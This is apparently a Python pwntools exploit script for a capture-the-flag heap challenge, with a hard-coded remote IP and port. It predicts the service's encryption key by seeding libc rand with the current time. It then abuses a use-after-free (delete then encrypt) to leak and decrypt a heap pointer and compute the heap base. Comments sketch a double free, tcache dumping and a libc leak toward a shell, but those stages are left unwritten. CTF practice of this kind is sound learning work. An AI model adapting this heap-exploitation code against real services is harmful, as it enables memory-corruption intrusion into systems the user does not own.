from ctypes import CDLL
from sys import *

from pwn import *

CONN = "nc 103.152.242.197 55950".split(" ")
HOST = CONN[1]
PORT = CONN[2]

# ===========================================================
#                    WRAPPER FUNCTION
# ===========================================================

def sl(x): io.sendline(x)
def sla(x, y): io.sendlineafter(x, y)
def se(x): io.send(x)
def sa(x, y): io.sendafter(x, y)
def ru(x, drop=False): return io.recvuntil(x, drop=drop)
def rl(): return io.recvline()
def cl(): io.clean()
def un64(x): return u64(x.ljust(8, b'\x00'))
def leak(name, addr): info(f"{name} @ {hex(addr)}")

# ===========================================================
#                           SETUP
# ===========================================================

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(HOST, PORT, *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify GDB script here (breakpoints etc)
gdbscript = """
c
""".format(
    **locals()
)

# Binary filename
exe = "./chall"

# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
rop = ROP(elf)
libc = ELF("./libc.so.6")
libc_dll = CDLL("libc.so.6")
libc_dll.srand(libc_dll.time(0))

# Change logging level to help with debugging (error/warning/info/debug)
context.terminal = "tmux splitw -h".split(" ")
context.log_level = "debug"

# Lib-C library, can use pwninit/patchelf to patch binary
# ld = ELF("/lib64/ld-linux-x86-64.so.2", checksec=False)

if args.REMOTE:
    pass
    # libc = ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec=False)
    # ld = ELF("/lib64/ld-linux-x86-64.so.2", checksec=False)

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================
def create(ID=0, size=0, message=''):
  sla(b"> ", b"1")
  sla(b"ID : ", str(ID).encode()) # 
  sla(b"Size : ", str(size).encode())
  sla(b"Message : ", message)
  
  return ID, size

def encrypt(id=0):
  sla(b"> ", b"2")
  sla(b"ID : ", str(id).encode())
  ru(b"Message : ")
  
  return ru(b"\n", drop=True)

def delete(id=0):
  sla(b"> ", b"3")
  sla(b": ", str(id).encode())


def create_key(size=0):
  key = [[0 for i in range(size)] for j in range(8)]

  for i in range(8):
    for j in range(size):
      key[i][j] = libc_dll.rand() & 0xff
  
  return key

def decrypt(enc, key):
  plain = enc
  for i in range(8):
      plain = xor(plain, key[i])
  
  return plain

io = start()

#]======== leak heap

chunkA, sizeA = create(0, 0x18, b"leaker")
chunkB, sizeB = create(0, 0x18, b"guard")

# for i in range(7):
#   create_key(0x88)

# for i in range(7):
#   delete(chunkA)
#   encrypt(chunkA)
  
key = create_key(0x18)
delete(chunkA)
leaked = encrypt(chunkA)
dec = decrypt(leaked, key)

print(dec)
heapbase = u64(dec[8:16]) - 0x10 

info("Heapbase: " + hex(heapbase))

#]======== Double free, Tcache dumping, leak libc
# delete(chunkA)


# Got Shell?
io.interactive()